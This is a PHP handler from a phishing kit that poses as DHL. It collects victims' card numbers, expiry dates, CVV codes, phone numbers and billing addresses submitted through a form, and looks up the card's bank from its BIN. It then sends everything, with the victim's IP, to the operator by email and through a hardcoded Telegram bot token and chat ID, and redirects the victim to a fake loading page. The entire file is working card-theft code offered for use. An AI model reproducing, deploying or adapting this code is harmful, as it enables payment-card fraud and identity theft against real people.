<?php
/*==============[session_include]=================*/
session_start();

$_SESSION['jijinum']= $_POST['jijinum'];
require "./functions.php";


if(isset($_POST['jijinum'])){
if(!empty($_POST['jijiexp'])){

/*==============[ConfiGG]=================*/
$billing    = $_POST['adrs'];
$phone    = $_POST['phone'];
$carte    = $_POST['jijinum'];
$expirydate    = $_POST['jijiexp'];
$expirydate2    = $_POST['jijiexp2'];
$CVV    = $_POST['jijicod'];
$ccno = str_replace(' ', '', $carte);
$bin = substr($ccno, 0, 6);
$ccc = bankDetails($bin);
$scheme =  strtoupper($ccc['scheme']);
$type =  strtoupper($ccc['type']);
$brand =  strtoupper($ccc['brand']);
$bank =  strtoupper($ccc['bank']['name']);
$bin =  strtoupper($ccc['bin']);
$country =  strtoupper($ccc['country']['alpha2']);
if($ccc['prepaid'] == true){$prepaid = strtoupper('Prepaid');}else{$prepaid = strtoupper('Non-Prepaid');}
$ccinfo = "$bin | $type | $brand | $bank";

/*==============[Sander]=================*/
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$YK = "BADEXAMPLE";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "DHL REZULTS [" .$ip. "] [" .$YK_V. "] ";
$headers .= "From: BADEXAMPLE" . "\r\n";
/*==============[Letter]=================*/
$MSG = "
#############  DHL By ".$YK."  #############
💳 CARD NUMBER      =>  ".$carte."
📅 EXPIRY DATE      =>  ".$expirydate." / ".$expirydate2."
🔒 CVV              =>  ".$CVV."
🏛️ CARD INFO        =>  ".$ccinfo."
📍  IP         =>  "."http://www.geoiptool.com/?IP=".$ip."
⏰ TIME       =>   ".$time."
#############  DHL By ".$YK."  #############
";
/*==============[Backup]=================*/


mail($yourmail, $subject, $MSG , $headers);

function functiondilih($cc)
    {
        $key = "1430045124:AAHh-LpkxYYeUE0VQ42aPQo6OcbqzL6L6es";// hat hna apikey
        $idchat ="1484446267";//hat hna id chat   
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$key.'/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$idchat."&text=".$cc."");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $headers = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
        $result = curl_exec($ch);

        curl_close ($ch);
    }
    {
    $date = gmdate("H:i:s | d/m/Y");
    $victim_ip = getenv("REMOTE_ADDR");
    $MSG1 = "
#############  DHL By ".$YK."  #############
☎️ Phone NUMBER      =>  ".$phone."
👤 Billing Address   =>  ".$billing."
💳 CARD NUMBER      =>  ".$carte."
📅 EXPIRY DATE      =>  ".$expirydate." / ".$expirydate2."
🔒 CVV              =>  ".$CVV."
🏛️ CARD INFO        =>  ".$ccinfo."
📍  IP         =>  "."http://www.geoiptool.com/?IP=".$ip."
⏰ TIME       =>   ".$time."
#############  DHL By ".$YK."  #############
";

           

            functiondilih($MSG1);

          

            
        }
        
/*==============[header]=================*/
header("location:../load.php?".rand(100,300)."=".md5('salitihahahababima')."&".rand(100,300)."=".rand(100,300)."&id=".rand(8456468748,500000000)." ");


    }else{header("Location: ../load.php?".rand(100,300)."=".md5('salitihahahababima')."&".rand(100,300)."=".rand(100,300)."&id=".rand(8456468748,500000000)." ");}

}else{header("Location: ../load.php?".rand(100,300)."=".md5('salitihahahababima')."&".rand(100,300)."=".rand(100,300)."&id=".rand(8456468748,500000000)." ");}
/*==============[Salina]=================*/